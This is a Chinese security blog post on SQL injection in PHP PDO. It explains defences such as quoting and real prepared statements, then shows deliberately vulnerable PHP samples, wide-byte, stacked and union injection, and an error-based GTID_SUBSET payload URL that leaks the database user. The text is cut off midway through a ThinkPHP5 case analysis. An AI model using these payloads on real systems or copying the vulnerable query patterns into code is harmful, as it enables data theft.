<!DOCTYPE html><html class="appearance-auto" lang="cn"><head><meta charset="UTF-8"><title>从PDO下的注入思路到获得Git 3000star项目0day</title><meta name="description" content="J0o1ey Blog | Hack for Sec and Good"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><script>var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
hm.src = "//hm.baidu.com/hm.js?" + '1da71ad199e154beef984da705235690';
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(hm, s);
})();</script><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="0x01 PDO简介PDO全名PHP Data Object
PDO扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以使用相同的函数（方法）来查询和获取数据。
PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO），列表性比较如下：




Mysqli
PDO
MySQL



引入的PHP版本
5.0
5.0
3.0之前


PHP5.x是否包含
是
是
是


服务端prepare语句的支持情况
是
是
否


客户端prepare语句的支持情况
否
是
否


存储过程支持情况
是
是
否


多语句执行支持情况
是
大多数
否


如需在php中使用pdo扩展，需要在php.ini文件中进行配置

0x02 PD.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">J0o1ey's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">从PDO下的注入思路到获得Git 3000star项目0day</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-PDO%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 PDO简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PDO%E9%98%B2%E8%8C%83SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">0x02 PDO防范SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E8%BD%AC%E4%B9%89%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-text">①调用方法转义特殊字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5"><span class="toc-text">②预编译语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E4%B8%8E%E6%80%9D%E8%80%83"><span class="toc-text">0x03 PDO下的注入手法与思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">①宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">②堆叠注入与报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%B2%A1%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%83%85%E5%86%B5"><span class="toc-text">2.1 没有过滤的堆叠注入情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E6%A8%A1%E6%8B%9F%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-text">2.2 模拟预处理的情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E5%BD%93%E8%AE%BE%E7%BD%AEPDO-ATTR-ERRMODE%E5%92%8CPDO-ERRMODE-EXCEPTION%E5%BC%80%E5%90%AF%E6%8A%A5%E9%94%99%E6%97%B6"><span class="toc-text">2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E9%9D%9E%E6%A8%A1%E6%8B%9F%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-text">2.4 非模拟预处理的情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84case"><span class="toc-text">③一个安全的case</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90-ThinkPHP5%E4%B8%ADPDO%E5%AF%BC%E8%87%B4%E7%9A%84%E4%B8%80%E4%B8%AA%E9%B8%A1%E8%82%8B%E6%B3%A8%E5%85%A5-%E6%9D%A5%E8%87%AAPhithon%E5%B8%88%E5%82%85"><span class="toc-text">0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-%E4%BB%8Ecl%E7%A4%BE%E5%8C%BA%E6%BF%80%E6%B4%BB%E7%A0%81%E5%88%B0Git-2000-Star%E9%A1%B9%E7%9B%AE0day"><span class="toc-text">0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-%E8%B5%B7%E5%9B%A0"><span class="toc-text">5.1 起因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-%E4%BB%8E%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%88%B0PDO%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0XFF%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">5.2 从审计思路到PDO导致的前台XFF堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-Prepare-Statement%E6%9E%84%E9%80%A0%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">5.3 Prepare Statement构造注入语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-%E4%B8%8D%E8%AE%B2%E6%AD%A6%E5%BE%B7%E8%A2%AB%E5%8F%91%E7%8E%B0"><span class="toc-text">5.4 不讲武德被发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-5-%E5%90%8E%E5%8F%B0Getshell%E5%AE%A1%E8%AE%A1-Thanks-17-M78sec"><span class="toc-text">5.5 后台Getshell审计(Thanks 17@M78sec)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-text">0x06 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Refence%EF%BC%9A"><span class="toc-text">0x07 Refence：</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><i class="tag post-item-tag">代码审计</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">从PDO下的注入思路到获得Git 3000star项目0day</h1><time class="has-text-grey" datetime="2021-05-25T03:59:22.000Z">2021-05-25</time><article class="mt-2 post-content"><h2 id="0x01-PDO简介"><a href="#0x01-PDO简介" class="headerlink" title="0x01 PDO简介"></a>0x01 PDO简介</h2><p>PDO全名PHP Data Object</p>
<p>PDO扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以使用相同的函数（方法）来查询和获取数据。</p>
<p>PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO），列表性比较如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>Mysqli</th>
<th>PDO</th>
<th>MySQL</th>
</tr>
</thead>
<tbody><tr>
<td>引入的PHP版本</td>
<td>5.0</td>
<td>5.0</td>
<td>3.0之前</td>
</tr>
<tr>
<td>PHP5.x是否包含</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>服务端prepare语句的支持情况</td>
<td>是</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>客户端prepare语句的支持情况</td>
<td>否</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>存储过程支持情况</td>
<td>是</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>多语句执行支持情况</td>
<td>是</td>
<td>大多数</td>
<td>否</td>
</tr>
</tbody></table>
<p>如需在php中使用pdo扩展，需要在php.ini文件中进行配置</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640774.png" alt="image"></p>
<h2 id="0x02-PDO防范SQL注入"><a href="#0x02-PDO防范SQL注入" class="headerlink" title="0x02 PDO防范SQL注入"></a>0x02 PDO防范SQL注入</h2><h3 id="①调用方法转义特殊字符"><a href="#①调用方法转义特殊字符" class="headerlink" title="①调用方法转义特殊字符"></a>①调用方法转义特殊字符</h3><p><strong>quote()方法(这种方法的原理跟addslashes差不多，都是转义)</strong></p>
<p>PDO类库的quate()方法会将输入字符串（如果需要）周围加上引号，并在输入字符串内转义特殊字符。</p>
<p>EG①:</p>
<pre><code class="PHP">&lt;?php
$conn = new PDO(&#39;sqlite:/home/lynn/music.sql3&#39;);

/* Dangerous string */
$string = &#39;Naughty &#39; string&#39;;
print &quot;Unquoted string: $stringn&quot;;
print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;n&quot;;
?&gt;
</code></pre>
<p>输出</p>
<pre><code class="php">Unquoted string: Naughty &#39; string
Quoted string: &#39;Naughty &#39;&#39; string&#39;
</code></pre>
<p>EG②</p>
<p>test.sql</p>
<pre><code>SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(10) NOT NULL,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL
) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (0, &#39;admin&#39;, &#39;admin&#39;);
INSERT INTO `user` VALUES (1, &#39;user&#39;, &#39;user&#39;);

SET FOREIGN_KEY_CHECKS = 1;
</code></pre>
<p>pdo.php</p>
<pre><code class="php">&lt;?php
header(&#39;content-type=text/html;charset=utf-8&#39;);
$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];
try&#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
     $username=$pdo-&gt;quote($username);
     $password=$pdo-&gt;quote($password);
    $sql=&quot;select * from user where username=&#123;$username&#125; and password=&#123;$password&#125;&quot;;
    echo $sql.&quot;&lt;/br&gt;&quot;;
    $row=$pdo-&gt;query($sql);
    foreach ($row as $key =&gt; $value) &#123;
        print_r($value);
    &#125;

&#125;catch(POOException $e)&#123;
    echo $e-&gt;getMessage();
&#125;
</code></pre>
<p>访问<a target="_blank" rel="noopener" href="http://localhost/pdo.php?username=admin&password=admin">http://localhost/pdo.php?username=admin&amp;password=admin</a></p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640915.png" alt="image"></p>
<p>当我们使用单引号探测注入时</p>
<p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640974.png" alt="image"></p>
<p>如图，单引号已被反斜线转义</p>
<h3 id="②预编译语句"><a href="#②预编译语句" class="headerlink" title="②预编译语句"></a>②<strong>预编译语句</strong></h3><p><strong>1、占位符-通过命名参数防止注入</strong></p>
<p>通过命名参数防止注入的方法会使得程序在执行SQL语句时，将会把参数值当成一个字符串整体来进行处理，即使参数值中包含单引号，也会把单引号当成单引号字符，而不是字符串的起止符。这样就在某种程度上消除了SQL注入攻击的条件。</p>
<p>将原来的SQL查询语句改为</p>
<pre><code>Select * from where name=:username and password=:password
</code></pre>
<p>prepare方法进行SQL语句预编译</p>
<p>最后通过调用rowCount()方法，查看返回受sql语句影响的行数</p>
<p>返回0语句执行失败，大于等于1，则表示语句执行成功。</p>
<p>All code</p>
<pre><code>&lt;?php
header(&#39;content-type:text/html;charset=utf-8&#39;);
$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];
try&#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    $sql=&#39;select * from user where name=:username and password=:password&#39;;
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;execute(array(&quot;:username&quot;=&gt;$username,&quot;:password&quot;=&gt;$password));
    echo $stmt-&gt;rowCount();
&#125;catch(PDOException $e)&#123;
    echo $e-&gt;getMessage();
&#125;
?&gt;
</code></pre>
<p>查询成功</p>
<p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p>
<p>注入失败</p>
<p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p>
<p><strong>2、占位符-通过问号占位符防止注入</strong></p>
<p>把SQL语句再进行修改</p>
<pre><code class="sql">select * from user where name=? and password=?
</code></pre>
<p>同上，prepare方法进行SQL语句预编译</p>
<p>最后调用rowCount()方法，查看返回受sql语句影响的行数</p>
<pre><code class="php">&lt;?
header(&#39;content-type:text/html;charset=utf-8&#39;);
$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];
try&#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    $sql=&quot;select * from user where username=? and password=?&quot;;
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;execute(array($username,$password));
    echo $stmt-&gt;rowCount();

&#125;catch(PDOException $e)&#123;
    echo $e-&gt;getMessage();
&#125;
?&gt;
</code></pre>
<p>效果同上</p>
<p>查询成功</p>
<p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p>
<p>注入失败</p>
<p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p>
<p><strong>3.通过bindParam()方法绑定参数防御SQL注入</strong></p>
<p>修改语句部分</p>
<pre><code class="php">$sql=&#39;select * from user where name=:username and password=:password&#39;;
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);
    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);
</code></pre>
<p><strong>解释：</strong><br>a)：:username 和 :password为命名参数<br>b)：$username;$password为获取的变量，即用户名和密码。<br>c)：PDO::PARAM_STR,表示参数变量的值一定要为字符串，即绑定参数类型为字符串。在bindparam()方法中，默认绑定的参数类型就是字符串。</p>
<p>​       当你要接受int型数据的时候可以绑定参数为PDO::PARAM_INT.</p>
<pre><code class="php">&lt;?php
header(&#39;content-type:text/html;charset=utf-8&#39;);
$username=$_GET[&#39;username&#39;];
$password=$_GETT[&#39;password&#39;];
try&#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    $sql=&#39;select * from user where name=:username and password=:password&#39;;
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);
    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);
    $stmt-&gt;execute();
    echo $stmt-&gt;rowCount();

&#125;catch(PDOException $e)&#123;
    echo $e-&gt;getMessage();
&#125;
?&gt;
</code></pre>
<p>效果同上</p>
<p>查询成功</p>
<p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p>
<p>注入失败</p>
<p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p>
<p>这只是总结了一部分PDO防范SQL注入的方法，仍有方法请见下文</p>
<p>其他手法还有很多，大家感兴趣的话可以自行研究</p>
<h2 id="0x03-PDO下的注入手法与思考"><a href="#0x03-PDO下的注入手法与思考" class="headerlink" title="0x03 PDO下的注入手法与思考"></a>0x03 PDO下的注入手法与思考</h2><p>读完前文后，读者们可能不由感叹，真狠啊，什么都tmd转义，什么语句都预编译了，这我tmd注入个毛…</p>
<p><img src="https://i.loli.net/2021/05/25/k3VIpq2GndYDKhg.png" alt="image-20210525143226397"></p>
<p><img src="https://i.loli.net/2021/05/25/mgUREqoKWj2Lc1O.jpg" alt="img"></p>
<p>北宋宰相王安石有言“看似寻常最奇崛,成如容易却艰辛”</p>
<p>让我们抽丝剥茧来探寻PDO下的注入手法</p>
<p>目前在PDO下，比较通用的手法主要有如下两种</p>
<h3 id="①宽字节注入"><a href="#①宽字节注入" class="headerlink" title="①宽字节注入"></a><strong>①宽字节注入</strong></h3><p>注入的原理就不讲了，相信大家都知道</p>
<p>一张图，清晰明了</p>
<p><img src="https://i.loli.net/2021/05/25/Vl2qxBSFykeNp5h.png" alt="image-20210525144401689"></p>
<p>当Mysql数据库my.ini文件中设置编码为gbk时，</p>
<p>我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql_real_escape_string()、mysql_escape_string()等函数、方法，或配置了magic_quotes_gpc&#x3D;on，依然可以通过构造%df’的方法绕过转义</p>
<h3 id="②堆叠注入与报错注入"><a href="#②堆叠注入与报错注入" class="headerlink" title="②堆叠注入与报错注入"></a>②堆叠注入与报错注入</h3><p>PDO分为<strong>模拟预处理</strong>和<strong>非模拟预处理</strong>。</p>
<p><strong>模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶</strong></p>
<p>在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。</p>
<p>PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p>
<p><strong>非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：</strong></p>
<p>第一步是prepare阶段，发送SQL语句模板到数据库服务器；</p>
<p>第二步通过execute()函数发送占位符参数给数据库服务器执行。</p>
<p><strong>PDO产生安全问题的主要设置如下：</strong></p>
<blockquote>
<p>​    PDO::ATTR_EMULATE_PREPARES    &#x2F;&#x2F;模拟预处理(默认开启)</p>
<p>​    PDO::ATTR_ERRMODE      &#x2F;&#x2F;报错</p>
<p>​    PDO::MYSQL_ATTR_MULTI_STATEMENTS      &#x2F;&#x2F;允许多句执行(默认开启)</p>
</blockquote>
<p>PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。</p>
<h4 id="2-1-没有过滤的堆叠注入情况"><a href="#2-1-没有过滤的堆叠注入情况" class="headerlink" title="2.1 没有过滤的堆叠注入情况"></a>2.1 没有过滤的堆叠注入情况</h4><pre><code class="php">&lt;?php
header(&#39;content-type=text/html;charset=utf-8&#39;);
$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];
try&#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    $sql=&quot;select * from user where username=&#39;&#123;$username&#125;&#39; and password=&#39;&#123;$password&#125;&#39;&quot;;
    echo $sql.&quot;&lt;/br&gt;&quot;;
    $row=$pdo-&gt;query($sql);
    foreach ($row as $key =&gt; $value) &#123;
        print_r($value);
    &#125;

&#125;catch(POOException $e)&#123;
    echo $e-&gt;getMessage();
&#125;
</code></pre>
<p>因为在$pdo&gt;query()执行之前，我们便可以对$sql进行非法操作，那PDO相当于没用</p>
<p><img src="https://i.loli.net/2021/05/25/iRY4JqCXH3TBZt1.png" alt="image-20210525161109702"></p>
<p><img src="https://i.loli.net/2021/05/25/zfiamDTkusvMg45.png" alt="image-20210525160856876"></p>
<p>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</p>
<pre><code class="php">new PDO($dsn, $user, $pass, array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))
</code></pre>
<p>但是哪怕禁止了多语句执行，也只是防范了堆叠注入而已，直接union即可</p>
<p><img src="https://i.loli.net/2021/05/25/qMptNExXKOeD27k.png" alt="image-20210525191231332"></p>
<h4 id="2-2-模拟预处理的情况"><a href="#2-2-模拟预处理的情况" class="headerlink" title="2.2 模拟预处理的情况"></a>2.2 模拟预处理的情况</h4><pre><code class="php">&lt;?php
try &#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    //$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $username = $_GET[&#39;username&#39;];
    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(1,$username);
    $stmt-&gt;execute();
    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
    &#123;
        var_dump($row);
        echo &quot;&lt;br&gt;&quot;;
    &#125;
&#125; catch (PDOException $e) &#123;
    echo $e;
&#125;
</code></pre>
<p>$role是可控的，导致可实现堆叠注入和in line query</p>
<p><img src="https://i.loli.net/2021/05/26/IbQoJZMV3BEW8xa.png" alt="image-20210526015752434"></p>
<p><img src="https://i.loli.net/2021/05/26/uxRIAn8C9gWVG5B.png" alt="image-20210526005239112"></p>
<h4 id="2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时"><a href="#2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时" class="headerlink" title="2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时"></a>2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时</h4><p>设置方法</p>
<pre><code class="php">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
</code></pre>
<p>无论是否开启PDO::ATTR_EMULATE_PREPARES-模拟预处理</p>
<p>此时SQL语句如果产生报错，PDO则会将报错抛出</p>
<p>除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。</p>
<p>此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域</p>
<p>在这种情况下可以实现error-based SQL Injection</p>
<p>使用GTID_SUBSET函数进行报错注入</p>
<pre><code class="sql">http://192.168.1.3/pdo.php?role=id OR GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),6700)&amp;username=admin&amp;username=admin
</code></pre>
<p><img src="https://i.loli.net/2021/05/26/1D5nIJ8tQVkAOHU.png" alt="image-20210526013121010"></p>
<h4 id="2-4-非模拟预处理的情况"><a href="#2-4-非模拟预处理的情况" class="headerlink" title="2.4 非模拟预处理的情况"></a>2.4 非模拟预处理的情况</h4><pre><code class="php">&lt;?php
try &#123;
    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);
    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $username = $_GET[&#39;username&#39;];
    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(1,$username);
    $stmt-&gt;execute();
    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
    &#123;
        var_dump($row);
        echo &quot;&lt;br&gt;&quot;;
    &#125;
&#125; catch (PDOException $e) &#123;
    echo $e;
&#125;
</code></pre>
<p>此时堆叠注入已经歇逼</p>
<p><img src="https://i.loli.net/2021/05/26/6AfJC7pE42OZU9I.png" alt="image-20210526015916363"></p>
<p>但inline query，报错注入依然坚挺可用</p>
<p><img src="https://i.loli.net/2021/05/26/rNZXVoWfLQed74n.png" alt="image-20210526014840025"></p>
<h3 id="③一个安全的case"><a href="#③一个安全的case" class="headerlink" title="③一个安全的case"></a>③一个安全的case</h3><p>只要语句内存在有用户非纯字符可控部分，便不够安全；那我们就用非模拟预处理sql写法</p>
<pre><code class="php">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 
</code></pre>
<p>它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。</p>
<p>这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p>
<p>如下为一个安全使用PDO的case</p>
<pre><code class="php">$pdo = new PDO(&#39;mysql:dbname=testdatabase;host=localhost;charset=utf8&#39;, &#39;root&#39;, &#39;root&#39;);
$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM wz_admin WHERE id = :id&#39;);
$stmt-&gt;execute(array(&#39;id&#39; =&gt; $id));
print_r($stmt -&gt; fetchAll ());
exit();
</code></pre>
<blockquote>
<p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符  </p>
<p>发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，它们是分开传送的，两者独立的，SQL注入攻击者没有一点机会</p>
</blockquote>
<h2 id="0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅"><a href="#0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅" class="headerlink" title="0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)"></a>0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)</h2><p>我们来看Phithon师傅几年前博客发的一个case</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
<pre><code class="php">&lt;?php
namespace app\index\controller;

use app\index\model\User;

class Index
&#123;
    public function index()
    &#123;
        $ids = input(&#39;ids/a&#39;);
        $t = new User();
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();
    &#125;
&#125;
</code></pre>
<p>如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。</p>
<p>文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：</p>
<pre><code class="php">&lt;?php
...
$bindName = $bindName ?: &#39;where_&#39; . str_replace([&#39;.&#39;, &#39;-&#39;], &#39;_&#39;, $field);
if (preg_match(&#39;/\W/&#39;, $bindName)) &#123;
    // 处理带非单词字符的字段名
    $bindName = md5($bindName);
&#125;
...
&#125; elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) &#123;
    // IN 查询
    if ($value instanceof \Closure) &#123;
        $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
    &#125; else &#123;
        $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
        if (array_key_exists($field, $binds)) &#123;
            $bind  = [];
            $array = [];
            foreach ($value as $k =&gt; $v) &#123;
                if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) &#123;
                    $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                &#125; else &#123;
                    $bindKey = $bindName . &#39;_in_&#39; . $k;
                &#125;
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = &#39;:&#39; . $bindKey;
            &#125;
            $this-&gt;query-&gt;bind($bind);
            $zone = implode(&#39;,&#39;, $array);
        &#125; else &#123;
